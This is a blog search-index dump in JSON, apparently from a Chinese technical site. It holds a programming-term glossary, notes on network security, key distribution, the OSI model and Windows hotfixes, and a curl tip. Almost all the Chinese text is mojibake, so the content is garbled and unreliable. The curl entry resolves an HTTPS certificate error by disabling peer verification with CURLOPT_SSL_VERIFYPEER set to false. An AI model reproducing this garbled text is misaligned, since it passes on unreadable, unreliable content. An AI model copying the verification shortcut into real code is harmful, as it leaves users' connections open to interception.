åˆ—å° æ‰“å° printer å°è¡¨æœº æ‰“å°æœº priority ä¼˜å…ˆæƒ (é€šå¸¸ç”¨æ–¼æ‰§è¡Œç»ªè·å¾— CPU æ—¶é—´çš„ä¼˜å…ˆæ¬¡åºï¼‰ procedure ç¨‹åº è¿‡ç¨‹ procedural ç¨‹åºæ€§çš„ã€ç¨‹åºå¼çš„ è¿‡ç¨‹å¼çš„ã€è¿‡ç¨‹åŒ–çš„ process è¡Œç¨‹ è¿›ç¨‹ profile è¯„æµ‹ è¯„æµ‹ profiler æ•ˆèƒ½ï¼ˆæ•ˆç‡ï¼‰è¯„æµ‹å™¨ æ•ˆèƒ½ï¼ˆæ€§èƒ½ï¼‰è¯„æµ‹å™¨ programmer ç¨‹å¼å‘˜ ç¨‹åºå‘˜ programming ç¼–ç¨‹ã€ç¨‹å¼è®¾è®¡ã€ç¨‹å¼åŒ– ç¼–ç¨‹ progress bar è¿›åº¦æŒ‡ç¤ºå™¨ è¿›åº¦æŒ‡ç¤ºå™¨ project ä¸“æ¡ˆ é¡¹ç›®ã€å·¥ç¨‹ property å±æ€§ protocol åå®š åè®® pseudo code å‡ç ã€è™šæ‹Ÿç ã€ä¼ªç  ä¼ªç  Q qualified ç»è¿‡èµ„æ ¼ä¿®é¥°ï¼ˆä¾‹å¦‚åŠ ä¸Š scope è¿ç®—å­ï¼‰ é™å®š qualifier èµ„æ ¼ä¿®é¥°è¯ã€é¥°è¯ é™å®šä¿®é¥°è¯ quality å“è´¨ è´¨é‡ queue ä¼«åˆ— é˜Ÿåˆ— R radian å¾„åº¦ å¼§åº¦ radio button åœ†é’® å•é€‰æŒ‰é’® raise å¼•å‘ï¼ˆå¸¸ç”¨æ¥è¡¨ç¤ºå‘å‡ºä¸€ä¸ª exceptionï¼‰ å¼•èµ·ã€å¼•å‘ random number éšæœºæ•°ã€ä¹±æ•° éšæœºæ•° range èŒƒå›´ã€åŒºé—´ï¼ˆç”¨æ–¼ STL æ—¶ï¼‰ èŒƒå›´ã€åŒºé—´ rank ç­‰çº§ã€åˆ†ç­‰ï¼ˆref. C++Primer 3/e 9,15ç« ï¼‰ ç­‰çº§ raw ç”Ÿé²œçš„ã€æœªç»å¤„ç†çš„ æœªç»å¤„ç†çš„ record è®°å½• è®°å½• recordset è®°å½•é›† è®°å½•é›† recursive é€’å› é€’å½’ reï¼direction é‡å¯¼å‘ é‡å®šå‘ refactoring é‡æ„ã€é‡æ•´ é‡æ„ refer å–ç”¨ åè€ƒ refer to æŒ‡å‘ã€æŒ‡æ¶‰ã€æŒ‡ä»£ reference ï¼ˆC++ ä¸­ç±»ä¼¼æŒ‡æ ‡çš„ä¸œè¥¿ï¼Œç›¸å½“æ–¼ â€œåŒ–èº«â€ï¼‰ å¼•ç”¨ã€åè€ƒ å€åå™¨, see pointer register æš‚å­˜å™¨ å¯„å­˜å™¨ reflection åå°„ åå°„ã€æ˜ åƒ relational database å…³è”å¼èµ„æ–™åº“ å…³ç³»æ•°æ®åº“ represent è¡¨è¿°ï¼Œè¡¨ç° è¡¨è¿°ï¼Œè¡¨ç° resolve å†³è®®ï¼ˆä¸ºç®—å¼ä¸­çš„ç¬¦å·åç§°å¯»æ‰¾ è§£æ å¯¹åº”ä¹‹å®£å‘Šå¼çš„è¿‡ç¨‹ï¼‰ resolution å†³è®®ç¨‹åºã€å†³è®®è¿‡ç¨‹ è§£æè¿‡ç¨‹ resolution è§£æåº¦ åˆ†è¾¨ç‡ restriction å±€é™ return ä¼ å›ã€å›è¿” è¿”å› return type å›è¿”å‹åˆ« è¿”å›ç±»å‹ return value å›è¿”å€¼ è¿”å›å€¼ robust å¼ºå›ºã€ç¨³å¥ å¥å£® robustness å¼ºå›ºæ€§ã€ç¨³å¥æ€§ å¥å£®æ€§ routine å¸¸å¼ ä¾‹ç¨‹ runtime æ‰§è¡ŒæœŸ è¿è¡ŒæœŸã€è¿è¡Œæ—¶ common language runtime (CLR) è¯‘ä¸ºã€Œé€šç”¨è¯­è¨€æ‰§è¡Œå±‚ã€ rvalue å³å€¼ å³å€¼ S save å‚¨å­˜ å­˜å‚¨ schedule æ’ç¨‹ è°ƒåº¦ scheduler æ’ç¨‹å™¨ è°ƒåº¦ç¨‹åº scheme ç»“æ„çº²ç›®ã€ç»„ç»‡çº²ç›® scroll bar å·è½´ æ»šåŠ¨æ¡ scope ç”Ÿå­˜ç©ºé—´ã€ç”Ÿå­˜èŒƒå›´ã€èŒƒç•´ã€ä½œç”¨åŸŸ ç”Ÿå­˜ç©ºé—´ scope operator ç”Ÿå­˜ç©ºé—´ï¼ˆèŒƒå›´å†³è®®ï¼‰è¿ç®—å­ :: ç”Ÿå­˜ç©ºé—´æ“ä½œç¬¦ scope resolution operator ç”Ÿå­˜ç©ºé—´å†³è®®è¿ç®—å­ ç”Ÿå­˜ç©ºé—´è§£ææ“ä½œç¬¦ ï¼ˆä¸scope operatoråŒï¼‰ screen è¤å¹• å±å¹• search æœå¯» æŸ¥æ‰¾ semantics è¯­æ„ è¯­ä¹‰ sequential container åºåˆ—å¼å®¹å™¨ é¡ºåºå¼å®¹å™¨ ï¼ˆå¯¹åº”æ–¼ associative containerï¼‰ server ä¼ºæœå™¨ã€ä¼ºæœç«¯ æœåŠ¡å™¨ã€æœåŠ¡ç«¯ serial ä¸²è¡Œ serialization æ¬¡ç¬¬è¯»å†™,åºåˆ—åŒ– åºåˆ—åŒ– (serialize) setter (ç›¸å¯¹æ–¼ getter) è®¾å€¼å‡½å¼ signal ä¿¡å· signature æ ‡è®°å¼ã€ç­¾åå¼ã€ç½²åå¼ ç­¾å slider æ»šè½´ æ»‘å— slot æ¡å­”ã€æ§½ æ§½ smart pointer çµå·§æŒ‡æ ‡ã€ç²¾çµæŒ‡æ ‡ æ™ºèƒ½æŒ‡é’ˆ snapshot è¤å¹•å¿«ç…§ï¼ˆå›¾ï¼‰ å±å¹•æˆªå›¾ specialization ç‰¹æ®ŠåŒ–ã€ç‰¹æ®ŠåŒ–å®šä¹‰ã€ç‰¹æ®ŠåŒ–å®£å‘Š ç‰¹åŒ– specification è§„æ ¼ è§„æ ¼ã€è§„èŒƒ splitter åˆ†è£‚è§†çª— åˆ‡åˆ†çª—å£ software è½¯ä½“ è½¯ä»¶ solution è§£æ³•,è§£å†³æ–¹æ¡ˆ æ–¹æ¡ˆ source åŸå§‹ç  æºç ã€æºä»£ç  stack å †å  æ ˆ stack unwinding å †å è¾—è½¬å¼€è§£ï¼ˆæ­¤è¯ç”¨æ–¼ exception ä¸»é¢˜ï¼‰ æ ˆè¾—è½¬å¼€è§£ * standard library æ ‡å‡†ç¨‹å¼åº“ standard template library æ ‡å‡†æ¨¡æ¿ç¨‹å¼åº“ statement è¿°å¥ è¯­å¥ã€å£°æ˜ status bar çŠ¶æ€åˆ—ã€çŠ¶æ€æ  çŠ¶æ€æ¡ STL è§ standard template library stream èµ„æ–™æµã€ä¸²æµ æµ string å­—ä¸² å­—ç¬¦ä¸² subroutine å­è·¯ç”± subscript operator ä¸‹æ ‡è¿ç®—å­ [ ] ä¸‹æ ‡æ“ä½œç¬¦ subtype å­å‹åˆ« å­ç±»å‹ support æ”¯æ´ æ”¯æŒ suspend è™šæ‚¬ æŒ‚èµ· symbol ç¬¦å· è®°å· syntax è¯­æ³• è¯­æ³• T tag æ ‡ç­¾ æ ‡è®° ç´¢å¼•æ ‡ç­¾,é¡µç­¾ target æ ‡çš„ï¼ˆä¾‹ target pointerï¼šæ ‡çš„æŒ‡æ ‡ï¼‰ ç›®æ ‡ task switch å·¥ä½œåˆ‡æ¢ ä»»åŠ¡åˆ‡æ¢ template æ¨¡æ¿ã€èŒƒæœ¬ æ¨¡æ¿ template argument deduction æ¨¡æ¿å¼•æ•°æ¨å¯¼ æ¨¡æ¿åæ•°æ¨å¯¼ template explicit specialization æ¨¡æ¿æ˜¾å¼ç‰¹åŒ–ï¼ˆç‰ˆæœ¬ï¼‰ æ¨¡æ¿æ˜¾å¼ç‰¹åŒ– template parameter æ¨¡æ¿åæ•° æ¨¡æ¿åæ•° temporary object æš‚æ—¶ç‰©ä»¶ ä¸´æ—¶å¯¹è±¡","tags":[{"name":"æ‰‹å†Œ","slug":"æ‰‹å†Œ","permalink":"https://hodlyounger.github.io/tags/%E6%89%8B%E5%86%8C/"},{"name":"è‹±è¯­","slug":"è‹±è¯­","permalink":"https://hodlyounger.github.io/tags/%E8%8B%B1%E8%AF%AD/"}],"categories":[{"name":"E_æ‰‹å†Œ","slug":"E-æ‰‹å†Œ","permalink":"https://hodlyounger.github.io/categories/E-%E6%89%8B%E5%86%8C/"},{"name":"En","slug":"E-æ‰‹å†Œ/En","permalink":"https://hodlyounger.github.io/categories/E-%E6%89%8B%E5%86%8C/En/"}]},{"title":"ã€Curlã€‘è¯·æ±‚ Https","date":"2023-10-27T01:24:02.466Z","path":"E_æ‰‹å†Œ/Curl/curlè¯·æ±‚https/","text":"ä½¿ç”¨ curl å‘é€ https è¯·æ±‚æ—¶ï¼Œå¦‚ä¸‹å‘½ä»¤å°±ä¼šæŠ¥é”™ï¼š 1curl &quot;https://www.baidu.com&quot; é”™è¯¯ä»£ç ï¼š curl: (60) SSL certificate problem: unable to get local issuer certificate More details here: https://curl.haxx.se/docs/sslcerts.html ä¸€èˆ¬çš„è§£å†³åŠæ³•å°±æ˜¯ä¸‹è½½CAè¯ä¹¦ã€‚ä½†æ˜¯ä½¿ç”¨C++ä»£ç è°ƒç”¨ libcurl å‘é€ https è¯·æ±‚ï¼Œåªéœ€è¦åœ¨è®¾ç½®ä¸€ä¸‹è¿™ä¸ªå°±å¯ä»¥å…³é—­ ssl éªŒè¯ï¼Œä»è€Œèƒ½å¤Ÿå‘é€ https è¯·æ±‚ã€‚ 1curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, false);","tags":[{"name":"curl","slug":"curl","permalink":"https://hodlyounger.github.io/tags/curl/"},{"name":"https","slug":"https","permalink":"https://hodlyounger.github.io/tags/https/"}],"categories":[{"name":"E_æ‰‹å†Œ","slug":"E-æ‰‹å†Œ","permalink":"https://hodlyounger.github.io/categories/E-%E6%89%8B%E5%86%8C/"},{"name":"Curl","slug":"E-æ‰‹å†Œ/Curl","permalink":"https://hodlyounger.github.io/categories/E-%E6%89%8B%E5%86%8C/Curl/"}]},{"title":"ã€æ‰‹å†Œã€‘CMakeList","date":"2023-10-27T01:24:02.464Z","path":"E_æ‰‹å†Œ/ã€æ‰‹å†Œã€‘CMakeä½¿ç”¨/","text":"æ¦‚è¿°ï¼š CMake ä½¿ç”¨æ‰‹å†Œ [toc] é»˜è®¤é…ç½® 1project","tags":[],"categories":[{"name":"E_æ‰‹å†Œ","slug":"E-æ‰‹å†Œ","permalink":"https://hodlyounger.github.io/categories/E-%E6%89%8B%E5%86%8C/"}]},{"title":"ç¬¬7ç«  ç½‘ç»œå®‰å…¨","date":"2023-10-27T01:24:02.462Z","path":"D_ç«‹å¿—åšè§ˆç¾¤ä¹¦/ã€Šè®¡ç®—æœºç½‘ç»œ ç¬¬7ç‰ˆã€‹/ç¬¬7ç«  ç½‘ç»œå®‰å…¨/index/","text":"æœ¬ç« åªæ˜¯å¯¹è®¡ç®—æœºç½‘ç»œå®‰å…¨é—®é¢˜è¿›è¡Œåˆæ­¥çš„ä»‹ç»ã€‚ æœ¬ç« æœ€é‡è¦çš„å†…å®¹æ˜¯ï¼š è®¡ç®—æœºå®Œäº†è¿‡é¢ä¸´çš„å®‰å…¨æ€§å¨èƒå’Œè®¡ç®—æœºç½‘ç»œå®‰å…¨çš„ä¸»è¦é—®é¢˜","tags":[{"name":"é˜²ç«å¢™","slug":"é˜²ç«å¢™","permalink":"https://hodlyounger.github.io/tags/%E9%98%B2%E7%81%AB%E5%A2%99/"},{"name":"å¯¹ç§°å¯†é’¥","slug":"å¯¹ç§°å¯†é’¥","permalink":"https://hodlyounger.github.io/tags/%E5%AF%B9%E7%A7%B0%E5%AF%86%E9%92%A5/"},{"name":"å…¬é’¥","slug":"å…¬é’¥","permalink":"https://hodlyounger.github.io/tags/%E5%85%AC%E9%92%A5/"},{"name":"ssl","slug":"ssl","permalink":"https://hodlyounger.github.io/tags/ssl/"},{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"https://hodlyounger.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"tls","slug":"tls","permalink":"https://hodlyounger.github.io/tags/tls/"},{"name":"ç³»ç»Ÿå®‰å…¨","slug":"ç³»ç»Ÿå®‰å…¨","permalink":"https://hodlyounger.github.io/tags/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/"},{"name":"æ•°å­—ç­¾åä¸é‰´åˆ«","slug":"æ•°å­—ç­¾åä¸é‰´åˆ«","permalink":"https://hodlyounger.github.io/tags/%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D%E4%B8%8E%E9%89%B4%E5%88%AB/"}],"categories":[{"name":"D_ç«‹å¿—åšè§ˆç¾¤ä¹¦","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/"},{"name":"ã€Šè®¡ç®—æœºç½‘ç»œ ç¬¬7ç‰ˆã€‹","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/ã€Šè®¡ç®—æœºç½‘ç»œ-ç¬¬7ç‰ˆã€‹","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E7%AC%AC7%E7%89%88%E3%80%8B/"},{"name":"ç¬¬7ç«  ç½‘ç»œå®‰å…¨","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/ã€Šè®¡ç®—æœºç½‘ç»œ-ç¬¬7ç‰ˆã€‹/ç¬¬7ç« -ç½‘ç»œå®‰å…¨","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E7%AC%AC7%E7%89%88%E3%80%8B/%E7%AC%AC7%E7%AB%A0-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"å¯†é’¥åˆ†é…","date":"2023-10-27T01:24:02.460Z","path":"D_ç«‹å¿—åšè§ˆç¾¤ä¹¦/ã€Šè®¡ç®—æœºç½‘ç»œ ç¬¬7ç‰ˆã€‹/ç¬¬7ç«  ç½‘ç»œå®‰å…¨/7.5 å¯†é’¥åˆ†é…/","text":"æ¦‚è¿°ï¼šå¯†é’¥åˆ†é…ç›¸å…³è¯´æ˜ å¯†é’¥åˆ†é… ç”±äºå¯†ç ç®—æ³•æ˜¯å…¬å¼€çš„ï¼Œç½‘è·¯çš„å®‰å…¨æ€§å°±å®Œå…¨åŸºäºå¯†é’¥çš„å®‰å…¨ä¿æŠ¤ä¸Šã€‚å› æ­¤åœ¨å¯†ç å­¦ä¸­å‡ºç°äº†ä¸€ä¸ªé‡è¦çš„åˆ†æ”¯â€”â€”å¯†é’¥ç®¡ç†ã€‚å¯†é’¥ç®¡ç†åŒ…æ‹¬ï¼šå¯†é’¥çš„äº§ç”Ÿã€åˆ†é…ã€æ³¨å…¥ã€éªŒè¯å’Œä½¿ç”¨ã€‚æœ¬èŠ‚åªè®¨è®ºå¯†é’¥çš„åˆ†é…ã€‚ å¯†é’¥åˆ†é…ï¼ˆæˆ–å¯†é’¥åˆ†å‘ï¼‰æ˜¯å¯†é’¥ç®¡ç†ä¸­æœ€å¤§çš„é—®é¢˜ã€‚å¯†é’¥å¿…é¡»é€šè¿‡æœ€å®‰å…¨çš„é€šè·¯è¿›è¡Œåˆ†é…ã€‚ ä¾‹å¦‚ï¼Œå¯ä»¥æ´¾éå¸¸å¯é çš„ä¿¡ä½¿æºå¸¦å¯†é’¥åˆ†é…ç»™äº’ç›¸é€šä¿¡çš„å„ç”¨æˆ·ã€‚è¿™ç§æ–¹æ³•ç§°ä¸ºç½‘å¤–åˆ†é…æ–¹å¼ã€‚ä½†éšç€ç”¨æˆ·çš„å¢å¤šå’Œç½‘ç»œæµé‡çš„å¢å¤§ï¼Œå¯†é’¥æ›´æ¢é¢‘ç¹ï¼ˆå¯†é’¥å¿…é¡»å®šæœŸæ›´æ¢æ‰èƒ½åšåˆ°å¯é ï¼‰ï¼Œæ´¾ä¿¡ä½¿çš„åŠæ³•å·²ä¸å†ä½¿ç”¨ï¼Œè€Œåº”é‡‡ç”¨ç½‘å†…åˆ†é…æ–¹å¼ï¼Œå³å¯¹å¯†é’¥è‡ªåŠ¨åˆ†é…ã€‚","tags":[{"name":"å¯†é’¥ç®¡ç†","slug":"å¯†é’¥ç®¡ç†","permalink":"https://hodlyounger.github.io/tags/%E5%AF%86%E9%92%A5%E7%AE%A1%E7%90%86/"},{"name":"å¯¹ç§°å¯†é’¥","slug":"å¯¹ç§°å¯†é’¥","permalink":"https://hodlyounger.github.io/tags/%E5%AF%B9%E7%A7%B0%E5%AF%86%E9%92%A5/"},{"name":"å…¬é’¥","slug":"å…¬é’¥","permalink":"https://hodlyounger.github.io/tags/%E5%85%AC%E9%92%A5/"}],"categories":[{"name":"D_ç«‹å¿—åšè§ˆç¾¤ä¹¦","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/"},{"name":"ã€Šè®¡ç®—æœºç½‘ç»œ ç¬¬7ç‰ˆã€‹","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/ã€Šè®¡ç®—æœºç½‘ç»œ-ç¬¬7ç‰ˆã€‹","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E7%AC%AC7%E7%89%88%E3%80%8B/"},{"name":"ç¬¬7ç«  ç½‘ç»œå®‰å…¨","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/ã€Šè®¡ç®—æœºç½‘ç»œ-ç¬¬7ç‰ˆã€‹/ç¬¬7ç« -ç½‘ç»œå®‰å…¨","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E7%AC%AC7%E7%89%88%E3%80%8B/%E7%AC%AC7%E7%AB%A0-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"OSIå‚è€ƒæ¨¡å‹","date":"2023-10-27T01:24:02.457Z","path":"D_ç«‹å¿—åšè§ˆç¾¤ä¹¦/ã€Šæ·±å…¥ç†è§£Windowsæ“ä½œç³»ç»Ÿã€‹/7-1-OSIå‚è€ƒæ¨¡å‹/","text":"OSI å‚è€ƒæ¨¡å‹æ˜¯ä¸€ä¸ªç†æƒ³åŒ–çš„æ–¹æ¡ˆã€‚è¿™ä¹ˆè¯´æ˜¯å› ä¸ºå¾ˆå°‘æœ‰ç³»ç»Ÿæ˜¯å®Œå…¨æŒ‰ç…§å®ƒæ¥å®ç°ï¼ˆå…³äºè¿™ä¸€ç‚¹å¯ä»¥åç»­å†è®¨è®ºï¼‰ï¼Œä½†æ˜¯å®ƒé€šå¸¸è¢«ç”¨æ¥ä½œä¸ºç½‘ç»œåŸç†è®¨è®ºçš„æ¡†æ¶ã€‚ ä¸€å°æœºå™¨ä¸Šçš„æ¯ä¸€å±‚éƒ½å‡è®¾å®ƒåœ¨è·Ÿå¦ä¸€å°æœºå™¨ä¸Šçš„åŒä¸€å±‚â€œé€šè¯â€ã€‚åœ¨åŒä¸€å±‚æ¬¡ä¸Šï¼Œä¸¤å°æœºå™¨â€œè¯´â€çš„æ˜¯åŒä¸€ç§è¯­è¨€æˆ–åè®®ã€‚ æ¯ä¸€æ¬¡ç½‘ç»œä¼ è¾“å¿…é¡»éƒ½è¦å‘ä¸‹ä¼ è¾“ï¼Œé€šè¿‡å®¢æˆ·æœºå™¨çš„æ¯ä¸€å±‚ï¼Œå†ä¼ è¾“åˆ°ç½‘ç»œä¸Šï¼Œç„¶åå†ç›®æ ‡æœºå™¨ä¸Šå‘ä¸Šä¼ é€’ï¼Œç›´è‡³åˆ°è¾¾æŸä¸€å¯ä»¥ç†è§£å’Œæ‰§è¡Œè¯¥è¯·æ±‚çš„å±‚ã€‚ åœ¨ OSI æ¨¡å‹ä¸­ï¼Œæ¯ä¸€å±‚çš„ç›®çš„æ˜¯ï¼šå‘æ›´é«˜çš„å±‚æä¾›æœåŠ¡ï¼Œå¹¶ä¸”å¯¹å¦‚ä½•åœ¨ä½å±‚ä¸Šå®ç°è¿™äº›æœåŠ¡è¿›è¡ŒæŠ½è±¡ã€‚ ä»¥ä¸‹å†…å®¹ä¸º OSI ä¸ƒå±‚ä¸­æ¯ä¸€å±‚çš„ä»‹ç»: ç‰©ç†å±‚ æ•°æ®é“¾è·¯å±‚ ç½‘ç»œå±‚ ä¼ è¾“å±‚ ä¼šè¯å±‚ è¡¨ç¤ºå±‚ åº”ç”¨å±‚","tags":[{"name":"ä¹¦ç±/ã€Šæ·±å…¥ç†è§£Windowsæ“ä½œç³»ç»Ÿã€‹","slug":"ä¹¦ç±-ã€Šæ·±å…¥ç†è§£Windowsæ“ä½œç³»ç»Ÿã€‹","permalink":"https://hodlyounger.github.io/tags/%E4%B9%A6%E7%B1%8D-%E3%80%8A%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Windows%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E3%80%8B/"},{"name":"Windows","slug":"Windows","permalink":"https://hodlyounger.github.io/tags/Windows/"},{"name":"ç½‘ç»œç¼–ç¨‹","slug":"ç½‘ç»œç¼–ç¨‹","permalink":"https://hodlyounger.github.io/tags/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"}],"categories":[{"name":"D_ç«‹å¿—åšè§ˆç¾¤ä¹¦","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/"},{"name":"ã€Šæ·±å…¥ç†è§£Windowsæ“ä½œç³»ç»Ÿã€‹","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/ã€Šæ·±å…¥ç†è§£Windowsæ“ä½œç³»ç»Ÿã€‹","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/%E3%80%8A%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Windows%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E3%80%8B/"}]},{"title":"çƒ­è¡¥ä¸æ”¯æŒ","date":"2023-10-27T01:24:02.457Z","path":"D_ç«‹å¿—åšè§ˆç¾¤ä¹¦/ã€Šæ·±å…¥ç†è§£Windowsæ“ä½œç³»ç»Ÿã€‹/3-13-çƒ­è¡¥ä¸æ”¯æŒ/","text":"[TOC] è¡¥ä¸ å®šä¹‰ è¡¥ä¸æ˜¯æŒ‡è¡£æœã€è¢«è¤¥ä¸Šä¸ºé®æ©ç ´æ´è€Œé’‰è¡¥ä¸Šçš„å°å¸ƒå—ã€‚æ˜ç™½äº†å—ï¼Ÿ ç°åœ¨ä¹ŸæŒ‡å¯¹äºå¤§å‹è½¯ä»¶ç³»ç»Ÿ(å¦‚å¾®è½¯æ“ä½œç³»ç»Ÿ)åœ¨ä½¿ç”¨è¿‡ç¨‹ä¸­æš´éœ²çš„é—®é¢˜ï¼ˆä¸€èˆ¬ç”±é»‘å®¢æˆ–ç—…æ¯’è®¾è®¡è€…å‘ç°ï¼‰è€Œå‘å¸ƒçš„è§£å†³é—®é¢˜çš„å°ç¨‹åºã€‚å°±åƒè¡£æœçƒ‚äº†å°±è¦æ‰“è¡¥ä¸ä¸€æ ·ï¼Œäººç¼–å†™ç¨‹åºä¸å¯èƒ½åå…¨åç¾çš„ï¼Œæ‰€ä»¥è½¯ä»¶ä¹Ÿå…ä¸äº†ä¼šå‡ºç°BUGï¼Œè€Œè¡¥ä¸æ˜¯ä¸“é—¨ä¿®å¤è¿™äº›BUGåšçš„å› ä¸ºåŸæ¥å‘å¸ƒçš„è½¯ä»¶å­˜åœ¨ç¼ºé™·ï¼Œå‘ç°ä¹‹åå¦å¤–ç¼–åˆ¶ä¸€ä¸ªå°ç¨‹åºä½¿å…¶å®Œå–„ï¼Œè¿™ç§å°ç¨‹åºä¿—ç§°è¡¥ä¸ã€‚è¡¥ä¸æ˜¯ç”±è½¯ä»¶çš„åŸæ¥ä½œè€…åˆ¶ä½œçš„ï¼Œå¯ä»¥è®¿é—®ç½‘ç«™ä¸‹è½½è¡¥ä¸ã€‚ è¡¥ä¸ä¸€èˆ¬éƒ½æ˜¯ .exe æ–‡ä»¶ å¾®è½¯è¡¥ä¸ å¾®è½¯çš„Windowsæ“ä½œç³»ç»Ÿæ¯”è¾ƒå¤§ï¼Œæ¯”è¾ƒå¤æ‚ã€‚å› æ­¤æ€»æœ‰è€ƒè™‘ä¸å‘¨çš„åœ°æ–¹ã€‚æœ‰äº›ç—…æ¯’æˆ–è€…é»‘å®¢å°±åˆ©ç”¨å¾®è½¯çš„æ¼æ´è¿›è¡Œæ”»å‡»ã€‚å¾®è½¯å‘ç°æ¼æ´åå°±å‘å¸ƒä¸€äº›è¡¥ä¸ç¨‹åºã€‚ æˆ‘ä»¬å¾—åˆ°å¾®è½¯çš„è¡¥ä¸ç¨‹åºåå®‰è£…åˆ°è®¡ç®—æœºä¸Šå°±å«æ‰“è¡¥ä¸ã€‚ ä»€ä¹ˆæ˜¯å¾®è½¯è¡¥ä¸ï¼Ÿ å¾®è½¯å‘å¸ƒçš„ç³»ç»Ÿè¡¥ä¸æœ‰ä¸¤ç§ç±»å‹ï¼šHotfix å’Œ Service Packï¼Œä¸‹é¢ä»‹ç»å®ƒä»¬ä¹‹é—´çš„åŒºåˆ«å’Œè”ç³»ã€‚ hotfix æ˜¯å¾®è½¯é’ˆå¯¹æŸä¸€ä¸ªå…·ä½“çš„ç³»ç»Ÿæ¼æ´æˆ–å®‰å…¨é—®é¢˜è€Œå‘å¸ƒçš„ä¸“é—¨è§£å†³ç¨‹åºï¼ŒHotfixçš„ç¨‹åºæ–‡ä»¶åæœ‰ä¸¥æ ¼çš„è§„å®šï¼Œä¸€èˆ¬æ ¼å¼ä¸ºâ€œäº§å“å-KBXXXXXX-å¤„ç†å™¨å¹³å°-è¯­è¨€ç‰ˆæœ¬.exeâ€ã€‚ç°åœ¨ä¸€ä¸ªä¾‹å­æ¥è¯¦ç»†è¯´æ˜ï¼šå¾®è½¯é’ˆå¯¹éœ‡è¡ç—…æ¯’è€Œå‘å¸ƒçš„Hotfixç¨‹åºåä¸ºâ€œWin2K-KB835732-X86-CHS.exeâ€ï¼Œæˆ‘ä»¬çŸ¥é“è¿™ä¸ªè¡¥ä¸æ˜¯é’ˆå¯¹Win2000ç³»ç»Ÿçš„ï¼Œå…¶çŸ¥è¯†åº“ç¼–å·ä¸º 835732ï¼Œåº”ç”¨äº X86 å¤„ç†å™¨å¹³å°ï¼Œè¯­è¨€ç‰ˆæœ¬ä¸ºç®€ä½“ä¸­æ–‡ã€‚ Hotfix æ˜¯é’ˆå¯¹æŸä¸€ä¸ªå…·ä½“é—®é¢˜è€Œå‘å¸ƒçš„è§£å†³ç¨‹åºï¼Œå› æ­¤å®ƒä¼šç»å¸¸å‘å¸ƒï¼Œæ•°é‡éå¸¸å¤§ã€‚ç”¨æˆ·æƒ³è¦çŸ¥é“ç›®å‰å·²ç»å‘å¸ƒäº†å“ªäº›Hotfixç¨‹åºæ˜¯ä¸€ä»¶éå¸¸éº»çƒ¦çš„äº‹ã€‚å› æ­¤å¾®è½¯å°†è¿™äº›Hotfixè¡¥ä¸å…¨éƒ¨æ‰“åŒ…æˆä¸€ä¸ªç¨‹åºæä¾›ç»™ç”¨æˆ·å®‰è£…ï¼Œè¿™å°±æ˜¯Service Packï¼Œç®€ç§°SPã€‚Service PackåŒ…å«äº†å‘å¸ƒæ—¥æœŸä»¥å‰æ‰€æœ‰çš„Hotfixç¨‹åºï¼Œå› æ­¤åªè¦å®‰è£…äº†å®ƒï¼Œå°±å¯ä»¥ä¿è¯è‡ªå·±ä¸ä¼šæ¼æ‰ä¸€ä¸ªHotfixç¨‹åºã€‚è€Œä¸”å‘å¸ƒæ—¶é—´æ™šçš„Service Packç¨‹åºä¼šåŒ…å«ä»¥å‰çš„Service Packï¼Œä¾‹å¦‚ SP3ä¼šåŒ…å«SP1ã€SP2çš„æ‰€æœ‰è¡¥ä¸ã€‚ çƒ­è¡¥ä¸æ”¯æŒ 